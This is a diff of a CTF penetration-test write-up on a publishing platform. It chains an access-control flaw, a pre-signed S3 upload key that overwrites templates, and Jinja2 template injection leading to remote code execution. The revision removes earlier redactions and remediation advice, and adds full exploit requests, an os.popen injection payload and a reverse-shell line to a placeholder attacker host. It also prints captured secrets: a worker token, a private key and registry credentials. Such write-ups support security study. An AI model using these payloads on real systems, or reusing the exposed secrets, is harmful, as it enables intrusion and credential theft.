@@ -1,199 +1,514 @@
-# Broken Access Control to S3 Template Modification to SSTI and RCE
+# Broken Access Control -> Unathorized S3 File modification -> SSTI -> RCE
 
-> This report documents an authorized security test in a CTF environment. Do not test systems without permission. This public version keeps the reproduction flow and root-cause details, but removes sensitive values, credentials, and command payloads that were observed during the challenge.
+*NOTE: This report is for educational purposes only. The target environment was an authorized offensive security CTF challenge. DO NOT attempt to target or test systems that you do not own or do not have explicit permission to test.*
 
-## Executive summary
+# **Vulnerability Definition & Executive Summary**
 
-The Northline Pages publishing platform had three connected vulnerabilities:
+The Northline Pages publishing platform suffers from Broken Access Control / Insecure Direct Object Reference (IDOR), followed by unrestricted S3 pre-signed upload key manipulation, and Server-Side Template Injection (SSTI) leading to a Remote Code Execution.
 
-1. An authenticated user could tamper with the `project_id` on the invitation-acceptance request and add their own account to another workspace as an editor.
-2. The upload-signing endpoint accepted a client-controlled S3 object key without enforcing a safe destination path. This allowed an editor to overwrite the workspace's template file in object storage.
-3. The preview worker used a Jinja2 environment that evaluated attacker-controlled template code. Once the template was modified, the worker executed template expressions as part of the preview generation flow.
+The flawed authorization logic occurs within the project invitation and membership assignment routine allowing an authenticated user to modify the target `project_id` during invitation acceptance. This allows the attacker to invite themselves into the victim's workspace, granting unauthorized editor privileges.
 
-This created a chain from unauthorized workspace access to arbitrary template modification to code execution inside the preview worker. The steps below document the reproduction flow and the observed impact.
+After that, the asset pre-signing endpoint fails to enforce strict path confinement on the destination storage key, permitting an attacker to request a pre-signed AWS S3 **PUT URL** targeting internal layout templates (`render/layout.html`). This enables the attacker to overwrite the server-side rendering template.
 
-## Finding 1: Broken access control in project membership creation
+Lastly, when the backend preview worker processes the site build using Python's **Jinja2** rendering engine, it parses the attacker-controlled template. By traversing `self.__init__.__globals__` into loaded runtime modules (`sys.modules['__main__'].os`), execution is pivoted into arbitrary command execution, resulting in a Remote Code Execution (RCE).
 
-- **Target:** `northline.prod.local:9080`
-- **Endpoint:** `POST /api/data/project_memberships`
-- **Affected parameter:** `project_id`
-- **Required access:** Authenticated user account
+Additional findings resulting from the RCE include:
+- **Container Environment Variables**
+- **Internal Service Credentials (e.g. tokens, private keys)**
+- **Worker Service Source Code**
 
-### Vulnerability
 
-The server trusted the `project_id` and `role` supplied by the client when handling the membership request. An attacker could change the UUID in the request body to target any project and assign themselves the `editor` role.
+# Finding 1: Broken Access Control on northline.prod.local:9080 through /api/data/project_memberships via POST Parameter "project_id" leading to unauthorized workspace invitation 
 
-### Reproduction PoC
+- **Target:** **northline.prod.local:9080**
+- Vulnerable Endpoint: **POST /api/data/project_memberships**
+- Vulnerable Component: POST Parameter `project_id`
 
-I created a second account named Bob and generated an invitation for that account. When Bob accepted the invitation, the request body contained a `project_id` value that I changed to the UUID of the target workspace.
+On **northline.prod.local:9080** through **/api/data/project_memberships**, the HTTP requests containing a manipulated `project_id` and `role` parameter within the JSON payload were transmitted during invitation redemption, bypassing ownership validation checks between the issued invitation token and the target workspace.
+
+As a result, the attacker can associate their authenticated user account with any customer project/workspace on the platform with elevated `editor` permissions, granting unauthorized read access to the workspace. 
+
+
+## Proof of Concept
+
+- Inviting myself into the workspace via the invitation link access. I created a new account named Bob. Then created an invitation meant for Bob.
+
+<img width="1901" height="948" alt="image" src="https://github.com/user-attachments/assets/916b4f2d-24ed-4059-ad20-d0057e658c3d" />
+
+
+
+- When accessing the generated link, we can observe that we can set the UUID of the project that we want to invite bob into, so we can replace it with the target/victim's UUID in the intercepted **POST request** when clicking "Join Team". As a result, Bob is invited as an Editor to the victim's workspace.
+
+<img width="1892" height="886" alt="image" src="https://github.com/user-attachments/assets/246aea05-46f8-4b30-a1c5-8de4bb799bbf" />
+
 
 ```http
 POST /api/data/project_memberships HTTP/1.1
 Host: northline.prod.local:9080
-Authorization: Bearer {REDACTED}
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://northline.prod.local:9080/invite/1XBauYJVLeCa2TxZfewg6uheRny3uBRN
 Content-Type: application/json
+Prefer: return=minimal
+Authorization: Bearer {REDACTED}
+Content-Length: 118
+Origin: http://northline.prod.local:9080
+Connection: keep-alive
 
-{"project_id":"TARGET_WORKSPACE_UUID","user_id":"BOB_USER_UUID","role":"editor"}
+{"project_id":"2f0fb497-eb2e-4eec-8fcb-b9e797d125e6","user_id":"421bda24-f8c0-4cbb-b673-51a77191a87f","role":"editor"}
 ```
 
-The server responded with `201 Created`. I confirmed that Bob's dashboard then showed the target workspace, and the Team page exposed the target member names and email addresses.
 
-### Impact
+<img width="1532" height="800" alt="image" src="https://github.com/user-attachments/assets/2a5d1f7a-42a0-4604-b708-77b59df7b373" />
 
-An attacker with an account could add themselves to another workspace without authorization, gain editor access, and read workspace metadata that should not have been visible.
 
-### Remediation
+Observe that we get a **201 Created** response from the server. 
 
-The server should ignore a user-supplied `project_id` when accepting an invite. It should instead load the valid invite record server-side, validate the token, confirm the invitation is still valid, and derive the project, user, and role from the stored invitation data.
+We can confirm the effect by checking our dashboard, and observe that we have successfully invited ourselves into someone's workspace.
 
-## Finding 2: Arbitrary storage key in the upload-signing endpoint
+<img width="1867" height="896" alt="image" src="https://github.com/user-attachments/assets/b2d1bbba-a0bf-4a75-ad86-31473e8ef60e" />
 
-- **Target:** `northline.prod.local:9080`
-- **Endpoint:** `POST /api/projects/{project_id}/uploads/sign`
-- **Affected parameter:** `key`
-- **Required access:** Editor access to a project
 
-### Vulnerability
 
-The upload-signing endpoint accepted an arbitrary object key without validating that it was a permitted location. This allowed an editor to request a pre-signed S3 `PUT` URL for an internal template path, including the project rendering template.
+- Additionally, we can view the Personal Details of the members of the compromised workspace via the Team tab.
 
-### Reproduction PoC
+<img width="1913" height="962" alt="image" src="https://github.com/user-attachments/assets/21acd9a5-b904-4e15-8ef3-cdb1206a49e2" />
 
-The Templates page showed that the application rendered Jinja templates. I sent a POST request to the upload-signing endpoint with a key pointing to the project template asset.
+Observe that we can see the member's Full Name and their email address.
+
+# Finding 2: Arbitrary Storage Key Path Manipulation (S3 Pre-Signed Uploads) on northline.prod.local:9080 through /api/projects/{project_id}/uploads/sign via POST parameter "key" leading to unauthorized modification of rendering templates
+
+- Target: **northline.prod.local:9080**
+- Vulnerable Endpoint: **POST /api/projects/{project_id}/uploads/sign**
+- Vulnerable Component: POST parameter `key`
+
+On **northline.prod.local:9080** through **/api/projects/{project_id}/uploads/sign**, the **POST** requests supplying arbitrary file paths inside the `key` parameter were transmitted, allowing the generation of valid AWS HMAC-SHA256 pre-signed **PUT** URLs pointing outside the legitimate user asset namespace (**projects/{own_project_id}/assets/**) and directly targeting backend rendering templates (**projects/{victim_project_id}/render/layout.html**).
+
+As a result, the attacker can leverage the generated pre-signed URL to upload and overwrite internal server-side template files on the underlying object storage bucket **/nl-assets/**. This allows the attacker to replace trusted rendering layouts with malicious template payloads.
+
+
+## Proof of Concept 
+
+- Checking the Templates web page, we can observe that it utilizes jinja rendering.
+
+<img width="1568" height="750" alt="image" src="https://github.com/user-attachments/assets/026c4f6d-3041-4a1c-a6cb-0d9838b14ac6" />
+
+
+- To generate a valid AWS HMAC-SHA256 pre-signed **PUT** URL, send the following **POST request**:
 
 ```http
-POST /api/projects/TARGET_PROJECT_UUID/uploads/sign HTTP/1.1
+POST /api/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/uploads/sign HTTP/1.1
 Host: northline.prod.local:9080
-Authorization: Bearer {REDACTED}
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
 Content-Type: application/json
+Authorization: Bearer {REDACTED}
+Content-Length: 71
+Origin: http://northline.prod.local:9080
+Connection: keep-alive
 
-{"key":"projects/TARGET_PROJECT_UUID/render/layout.html"}
+{"key":"projects/{VICTIM_PROJECT_ID}/render/layout.html"}
 ```
 
-The server returned a valid pre-signed URL for a `PUT` operation. I then used that URL to upload a modified HTML template body.
+<img width="1517" height="777" alt="image" src="https://github.com/user-attachments/assets/b4ff160b-ef5e-4fad-84d0-ab18ff280b37" />
+
+
+Observe that the server responded with a PUT URL that we can now use to modify the rendering template asset (**projects/{VICTIM_PROJECT_ID}/render/layout.html**). Make sure to take note of the value of the `put_url` parameter in the response.
+
+- To modify the rendering template asset, send the following **PUT request**, inserting the PUT URL parameters noted within the previous step.
 
 ```http
-PUT /nl-assets/projects/TARGET_PROJECT_UUID/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=... HTTP/1.1
+PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T035045Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=5b163533a44710b39e05b63d43c2aa3204c436e5fc4b3cc03a945de2f15c2739 HTTP/1.1
 Host: northline.prod.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
 Content-Type: text/html
+Content-Length: 55
+Origin: http://northline.prod.local:9080
+Connection: keep-alive
 
 <h1>MODIFIED BY BOB</h1>
 <p>{{ site.description }}</p>
 ```
 
-After triggering a preview, the modified content appeared in the rendered output. This demonstrated that the signed upload endpoint could overwrite the internal template used by the preview worker.
+<img width="1888" height="983" alt="image" src="https://github.com/user-attachments/assets/326f93f4-ed41-4db5-a190-a84b985a19ba" />
 
-### Impact
 
-An authenticated editor could replace the rendering template for a project and alter the content processed by the preview system. This created the path for server-side template injection.
+- We can observe the modified result by generating another preview via the BUILD -> Generate Preview. Then wait for the preview to be done, and when visited, we can now see that we have successfully modified the rendering template.
 
-### Remediation
+<img width="1918" height="1002" alt="image" src="https://github.com/user-attachments/assets/0f2b32e7-d570-411c-9cee-6838a0dd346d" />
 
-The server should generate the storage key itself and enforce a strict allowlist. User input should never be able to define a signed upload target for internal template files or path traversal destinations. Internal render templates should be stored outside the user-writable upload area.
 
-## Finding 3: Server-side template injection in the preview worker
 
-- **Target:** `northline.prod.local:9080`
-- **Affected component:** Jinja2 rendering in `/app/worker.py`
-- **Trigger:** Preview generation after template modification
-- **Required access:** Editor access to the project
 
-### Vulnerability
 
-The preview worker parsed the stored template with Jinja2 using the default environment. Because the template content was attacker-controlled and the worker evaluated it, Jinja expressions were executed as part of the preview rendering flow.
+# Finding 3: Server-Side Template Injection (SSTI) on northline.prod.local:9080 through /nl-assets/projects/{target_workspace_uuid}/render/layout.html leading to Remote Code Execution (RCE)
+ 
+- Target: **northline.prod.local:9080**
+- Vulnerable Component: Jinja2 Template Engine (`jinja2.Environment.from_string().render()`)
+- Vulnerable Routine / File: `/app/worker.py` (Background Build Worker)
+- Trigger Vector: Studio Build Preview Workflow (via the web application dashbaord)**
 
-### Reproduction PoC
 
-The first proof that the template was being evaluated came from a basic arithmetic expression:
+On **northline.prod.local:9080** through **/nl-assets/projects/{target_workspace_id}/render/layout.html** and the Studio preview worker trigger, HTTP requests containing custom Jinja2 expressions were injected into the template layout, which was subsequently evaluated by Python's Jinja2 runtime without context sandboxing or expression filtering.
+
+
+As a result, the attacker can access `self.__init__.__globals__.sys.modules['__main__'].os.popen()` to execute arbitrary operating system commands within the preview worker container, leading to Remote Code Execution (RCE).
+
+
+## Proof of Concept
+
+- Using the unauthorized rendering template modification vulnerability from the previous step, we can confirm that the web application is vulnerable to SSTI, by sending the following request:
 
 ```http
-PUT /nl-assets/projects/TARGET_PROJECT_UUID/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=... HTTP/1.1
+PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T040115Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=3cc5e2d6c0c930e1f33bda5e42f5e0c5f3ad8c0b9213e9e5fccd63694f4272e1 HTTP/1.1
 Host: northline.prod.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
 Content-Type: text/html
+Content-Length: 44
+Origin: http://northline.prod.local:9080
+Connection: keep-alive
 
 <h1>MODIFIED BY BOB</h1>
 <p>{{ 7 * 7 }}</p>
 ```
 
-The preview output displayed `49`, proving that Jinja expressions inside the template were executed by the backend.
+<img width="1845" height="953" alt="image" src="https://github.com/user-attachments/assets/83960cc4-51b4-4ec0-a032-162b4e886a89" />
 
-I then tested access to Python objects via the template engine. The payload was a Jinja expression that traversed into the rendering environment:
+Observe that the operation we have included in the Rendering Template Body was processed.
 
-```html
+
+- Moreover, we can try to read the Environment Variables by sending  the following **PUT request** 
+
+```http
+PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T063241Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=e17693bef57d431c0d36bfcdaa1ae3d978f9dbfba0d05dc09dd13856e97c4415 HTTP/1.1
+Host: northline.prod.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, brReferer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
+Content-Type: text/html
+Content-Length: 107
+Origin: http://northline.prod.local:9080
+Connection: keep-alive
+
+<h1>{{ site.headline }}</h1>
+<p>
 {{ self.__init__.__globals__.sys.modules['__main__'].os.environ }}
+</p>
 ```
 
-The worker responded with rendered data containing internal environment values and service metadata. In the authorized CTF test, this also led to command execution in the worker container and access to associated worker files and secrets. Those values are intentionally redacted in this public report.
 
-A command execution proof used the same approach but invoked `os.popen()` through the template environment:
+<img width="1878" height="902" alt="image" src="https://github.com/user-attachments/assets/ca1915fa-2c20-4a7e-bbc5-a51fe1706120" />
 
-```html
-{{ self.__init__.__globals__.sys.modules['__main__'].os.popen('id').read() }}
+
+Observe that it contains internal API endpoints and tokens.
+
+- To initialize a basic Remote Code Execution, we can send the following **PUT request**, replacing the  `{INSERT_COMMAND}` with the command you wish to run.
+ 
+```http
+PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T070631Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=da055586c2fd550cb6bce25cfa1760bb7ac8767042821b8759c81cc538e5132f HTTP/1.1
+Host: northline.prod.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
+Content-Type: text/html
+Content-Length: 118
+Origin: http://northline.prod.local:9080
+Connection: keep-alive
+
+<h1>{{ site.headline }}</h1>
+<p>
+{{ self.__init__.__globals__.sys.modules['__main__'].os.popen('{INSERT_COMMAND}').read() }}
+</p>
 ```
 
-This returned command output from inside the worker container. In the challenge environment, this same path was used to access container state and worker-side data.
+In this case we tried running the command `env`, and retrieved the container environment variables seen earlier. 
 
-### Impact
+```python
+HOSTNAME=7f137f0e869c
+WORKER_TOKEN=VeT8iX1PU251DWtkNdPHc0fzuiRU3Soq6FvdnTiJUtMu4oxtuH18rw
+HOME=/home/worker
+GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
+PYTHON_SHA256=5c8462af5790baf43a321a1559dbe0db06d1be4300fb85fb53c40060668e548a
+RELEASE_URL=http://release:7070
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+REGISTRY_URL=http://registry:5000
+LANG=C.UTF-8
+PYTHON_VERSION=3.12.14
+VALKEY_URL=redis://valkey:6379/0
+PWD=/app
+API_INTERNAL_URL=http://api:8000
+```
 
-This was a server-side template injection leading to remote code execution in the preview worker. The worker evaluated untrusted template content and executed OS commands in the container context. The challenge test exposed worker environment data, source code, and secret values stored in the worker environment and mounted secret files.
+- We have attempted to initiate a shell via the following **PUT request**, replacing the `{ATTACKER_SERVER}` and the `{PORT}` with the attacker's Server Domain/IP and the Port.
 
-### Remediation
+```http
+PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261009%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261009T074042Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=aed9d8d1d61d5a9dd57b6bec67983353fac94607849f991aa09c4fd66b05db2d HTTP/1.1
+Host: northline.prod.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://northline.prod.local:9080/studio/projects/236f85ce-0599-45d4-a34c-164c486dd4d9
+Content-Type: text/html
+Content-Length: 236
+Origin: http://northline.prod.local:9080
+Connection: keep-alive
 
-Do not render user-controlled templates in a general-purpose Jinja2 environment. Use a sandboxed environment, reduce the context, and avoid exposing Python internals to templates. If full template rendering is not required, use a logic-less template format or a restricted rendering layer. The worker should also run with minimal privileges, minimal network reachability, and short-lived secrets.
+<h1>{{ site.headline }}</h1>
+<p>
+{{ self.__init__.__globals__.sys.modules['__main__'].os.popen("setsid nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_SERVER}/{PORT} 0>&1 &' >/dev/null 2>&1 &").read() }}
+</p>
+```
 
-## Overall impact
+*screenshot*
 
-The combined chain was:
+<img width="775" height="181" alt="image" src="https://github.com/user-attachments/assets/251e3738-4c62-4a20-9e70-4b516b0f6039" />
 
-1. self-register an account
-2. tamper with `project_id` during invitation acceptance
-3. become an editor in another workspace
-4. request a signed upload URL for the internal render template
-5. overwrite `render/layout.html`
-6. trigger preview generation
-7. execute Jinja expressions in the worker environment
-8. retrieve internal data and run commands in the worker container
+- Additionally we have also been able to read the `worker.py` source code via the following command:
 
-This resulted in unauthorized workspace access, template tampering, and remote code execution in the preview worker in the challenge environment.
+```bash
+cat /app/worker.py
+```
 
-## CVSS assessment
 
-### Finding 1: Broken access control
+*Result:*
 
-**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` - **6.5 (Medium)**
+```python
+from __future__ import annotations
 
-The issue allowed workspace membership to be created for another project without authorization. The user had to create and authenticate an account, but self-registration was available.
+import hashlib
+import multiprocessing
+import os
+import queue
+import signal
+import time
+import traceback
 
-### Finding 2: Arbitrary storage key in pre-signed uploads
+import redis
+import requests
+from jinja2 import Environment
 
-**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` - **4.3 (Medium)**
 
-This required editor access and allowed internal template tampering. It did not by itself expose data, but it enabled the SSTI trigger.
+VALKEY_URL = os.environ["VALKEY_URL"]
+API_URL = os.environ["API_INTERNAL_URL"].rstrip("/")
+TOKEN = os.environ["WORKER_TOKEN"]
+HEADERS = {"X-Worker-Token": TOKEN}
 
-### Finding 3: Server-side template injection leading to code execution
 
-**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` - **9.9 (Critical)**
+def render_child(template: str, site: dict, result_queue: multiprocessing.Queue):
+    os.setsid()
+    try:
+        environment = Environment(autoescape=True)
+        html = environment.from_string(template).render(site=site)
+        result_queue.put({"state": "succeeded", "preview_html": html[:200_000], "error": ""})
+    except BaseException as exc:
+        result_queue.put({"state": "failed", "preview_html": "", "error": f"{type(exc).__name__}: {exc}"})
 
-Once the template was modified, the worker evaluated attacker-controlled expressions and executed commands in the worker container.
 
-### Overall vulnerability chain
+def process_build(build_id: str):
+    job_resp = requests.post(API_URL + f"/internal/build-job/{build_id}", headers=HEADERS, timeout=5)
+    if job_resp.status_code != 200:
+        print(f"build {build_id}: unavailable {job_resp.status_code}", flush=True)
+        return
+    job = job_resp.json()
+    template_sha = ""
+    try:
+        template_resp = requests.get(job["template_url"], timeout=8)
+        template_resp.raise_for_status()
+        template_bytes = template_resp.content
+        if len(template_bytes) > 200_000:
+            raise ValueError("Template exceeds the preview limit.")
+        template = template_bytes.decode("utf-8")
+        template_sha = hashlib.sha256(template_bytes).hexdigest()
+        result_queue: multiprocessing.Queue = multiprocessing.Queue(maxsize=1)
+        child = multiprocessing.Process(target=render_child, args=(template, job["site"], result_queue))
+        child.start()
+        child.join(timeout=20)
+        if child.is_alive():
+            try:
+                os.killpg(child.pid, signal.SIGKILL)
+            except ProcessLookupError:
+                pass
+            child.join(timeout=2)
+            result = {"state": "failed", "preview_html": "", "error": "Preview exceeded the 20-second render limit."}
+        else:
+            try:
+                result = result_queue.get(timeout=2)
+            except queue.Empty:
+                result = {"state": "failed", "preview_html": "", "error": "Renderer exited without a result."}
+    except Exception as exc:
+        result = {"state": "failed", "preview_html": "", "error": f"{type(exc).__name__}: {exc}"}
+    result["build_id"] = build_id
+    result["template_sha256"] = template_sha
+    try:
+        post = requests.post(API_URL + "/internal/build-result", json=result, headers=HEADERS, timeout=5)
+        print(f"build {build_id}: {result['state']} ({post.status_code})", flush=True)
+    except requests.RequestException as exc:
+        print(f"build {build_id}: result delivery failed: {exc}", flush=True)
 
-**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` - **10.0 (Critical)**
 
-This score reflects the full chain from public account creation to unchecked workspace permissions, template overwrite, and worker compromise.
+def main():
+    connection = redis.Redis.from_url(VALKEY_URL, decode_responses=True)
+    while True:
+        try:
+            item = connection.blpop("northline:builds", timeout=5)
+            if item:
+                process_build(item[1])
+        except KeyboardInterrupt:
+            raise
+        except BaseException as exc:
+            print(f"worker loop recovered from {type(exc).__name__}: {exc}", flush=True)
+            time.sleep(2)
 
-## Remediation summary
 
-1. Treat project membership as a server-side decision. Derive the target project from a valid invitation record, not from a client-supplied `project_id`.
-2. Generate upload keys on the server and restrict them to exact, allowlisted object paths. Do not allow user-controlled keys to target internal render templates.
-3. Do not render user-controlled templates with a general-purpose Jinja2 environment. Use sandboxing, a restricted context, or a logic-less template system.
-4. Run the preview worker with minimal privileges, isolated networking, and short-lived secrets. Remove long-lived credentials from environment variables whenever possible.
-5. Treat WAF rules as a detection layer only. They do not replace authorization checks or strict upload validation.
-6. Keep Jinja2 patched and reviewed. Version upgrades do not make unsandboxed use of untrusted templates safe.
+if __name__ == "__main__":
+    main()
+```
 
-## References
+- Moreover, we have read access to the `preview_key.pem` and the `registry_credentials`
 
-- [OWASP Top 10: A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
-- [PortSwigger Web Security Academy: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
-- [Jinja2 documentation: Sandboxed Environment](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
-- [AWS S3 documentation: Uploading objects with presigned URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+```bash
+worker@7f137f0e869c:/run/secrets$ ls
+preview_key.pem  registry_credentials  worker_ref
+worker@7f137f0e869c:/run/secrets$ cat preview_key.pem 
+-----BEGIN PRIVATE KEY-----
+MC4CAQAwBQYDK2VwBCIEIEMDEAFL976Oix9UDMZysrxwlVmYKXbsu0AclwzK55m+
+-----END PRIVATE KEY-----
+worker@7f137f0e869c:/run/secrets$ cat registry_credentials 
+preview-worker:tkDPW4xZ8wmWaPf1eucHqAf0cfBRgDNMzGjZLA
+worker@7f137f0e869c:/run/secrets$ 
+```
+
+*Note: To ensure system stability, destructive actions (such as shutting down host services) were not performed.*
+
+
+
+---
+# Impact
+- Unauthorized invitation of users to an external workspace that they shouldn't have access to.
+- Insufficient server-side path validation allowing authenticated users to overwrite the workspace's application templates `render/layout.html` stored within object storage.
+- Remote Code Execution (RCE), as a result of the Server Side Template Injection (SSTI) vulnerability. Unsandboxed evaluation of the Jinja2 templates directly executes arbitrary operating system commands with `worker` user privileges within the preview rendering container.
+	- Additional Finding includes; Container environment Variable and Worker Container Source Code, Credentials such as Tokens, `.pem` Private key, Registry credentials belonging to the user.
+
+---
+# CVSS
+
+## Finding 1: Broken Access Control leading to unauthorized workspace invitation 
+
+*CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N - 6.5 (Medium)*
+
+- **Attack Vector (AV):** Network (`N`) - Exploitable remotely (via the network) on the HTTP endpoints.
+- **Attack Complexity (AC):** Low (`L`)  - The UUID pre-requisite can be found publicly.
+- **Privileges Required (PR):** None (`N`) -  Although the exploit requires a registered account, anyone can self-register and create an account. Making it exploitable by anyone.
+- **User Interaction (UI):** None (`N`) - The exploit does not require the victim to take action.
+- **Scope (S):** Unchanged (`U`) -  The vulnerable component and the impacted component are the same
+- **Confidentiality (C):** Low (`L`) - The resulting impact of the vulnerability exposes the Full name and Email address of the members of the compromised Workspace. No other sensitive personal details have been exposed.
+- **Integrity (I):** Low (`L`) - Unauthorized invitation of users to arbitrary workspaces. No major system-wide integrity was demonstrated via the vulnerability.
+- **Availability (A):** None (`N`) - There were no Availability impact shown in this vulnerability. Additionally, the editor does not have the ability to delete or alter the existing live website within the compromised Workspace.
+
+## Finding 2: Arbitrary Storage Key Path Manipulation (S3 Pre-Signed Uploads)
+
+*CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N - 4.3 (Medium)*
+
+- **Attack Vector (AV): Network (`N`)** - Can be exploited over network via the HTTP requests.
+- **Attack Complexity (AC): Low (`L`)** - No additional conditions required to exploit, and changing the JSON parameter value `key` will give us a valid pre-signed **PUT** URL.
+- **Privileges Required (PR): Low (`L`)** - Requires an account that possesses `editor` role on the workspace (the role can be acquired via Finding 1).
+- **User Interaction (UI): None (`N`)** - No interaction required from other users.
+- **Scope (S): Unchanged (`U`)** - Both the asset-signing endpoint and the S3 bucket operate within the object-storage domain of the application.
+- **Confidentiality (C): None (`N`)** - The generated a pre-signed `PUT` URL and uploading a template does not read or leak files directly by itself.
+- **Integrity (I): Low (`L`)** - Through the vulnerability, it was shown that the attacker can modify and replace the internal layout template (`render/layout.html`) of the workspace on object storage.
+- **Availability (A): None (`N`)** - The object storage service remained available, and no files were deleted.
+
+
+## Finding 3: Server-Side Template Injection (SSTI) leading to a Remote Code Execution
+
+*CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H - 9.9 (Critical)*
+
+- **Attack Vector (AV): Network (`N`)** - Exploited remotely over the network.
+- **Attack Complexity (AC): Low (`L`)** - The exploit doesn't need pre-requisites to be successful. As shown in the PoC, the Jinja2 template syntax (`{{ ... }}`) is directly processed without filtering or execution obstacles.
+- **Privileges Required (PR): Low (`L`)** - Requires an account that possesses `editor` role on the workspace (the role can be acquired via Finding 1), to trigger a build preview on a project where the layout was replaced.
+- **User Interaction (UI): None (`N`)** - The execution does not require any user to interact, and the preview build is initiated as soon as it is requested.
+- **Scope (S): Changed (`C`)** -  The vulnerability exists within the web application template parser (Jinja2), as a result the execution breaks out directly into the underlying operating system environment of the `preview-worker` container.
+- **Confidentiality (C): High (`H`)** - It was demonstrated that we can extract sensitive container environment variables (`WORKER_TOKEN`), local filesystem source code (`worker.py`), internal private keys (`preview_key.pem`), and registry credentials (`registry_credentials`).
+- **Integrity (I): High (`H`)** - Integrity is rated High because the attacker achieved interactive shell access and arbitrary command execution with the privileges of the worker user.
+- **Availability (A): High (`H`)** - While the container did not suffer a full denial of service, the attacker demonstrated arbitrary command execution and background process execution, with the capability to interrupt or terminate the local worker process.
+
+
+## Overall Vulnerability Chain CVSS
+
+*CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H — Score: 10.0 (Critical)*
+
+- **Attack Vector (AV): Network (`N`)** - The exploit can be chained and executed entirely over the network via standard HTTP endpoints.
+- **Attack Complexity (AC): Low (`L`)** - The vulnerability follows a deterministic, repeatable path from public project reconnaissance to remote code execution.
+- **Privileges Required (PR): None (`N`)** - Privileges Required is None because, when chained from the initial entry point, an unauthenticated external attacker can self-register an account, force membership into an arbitrary workspace, modify storage keys, and achieve execution without pre-existing authorized access to the target workspace.
+- **User Interaction (UI): None (`N`)** - The attack sequence can be performed by the attacker only, without any other User Interaction.
